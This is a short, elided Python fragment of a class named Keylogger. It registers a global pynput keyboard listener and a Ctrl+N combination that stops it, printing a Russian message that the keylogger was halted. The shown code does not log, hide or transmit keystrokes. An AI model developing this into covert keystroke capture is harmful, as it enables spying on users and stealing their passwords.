...
class Keylogger:
    def __init__(self):
        self.combinations = {(Key.ctrl, KeyCode.from_char('n')):self.leave}
    ...
    def leave(self):
        self.listener.stop()
        sys.stdout.write('была нажата комбинация остановки работы кейлоггера\n')
        self.running = False
    ...
    def keystroke_interception(self, key):
        ...
        for combo, func in self.combinations.items():
...
def run():
    ...
    kl = Keylogger()
    listener = Listener(on_press=kl.keystroke_interception, on_release=kl.on_release)
    listener.start()
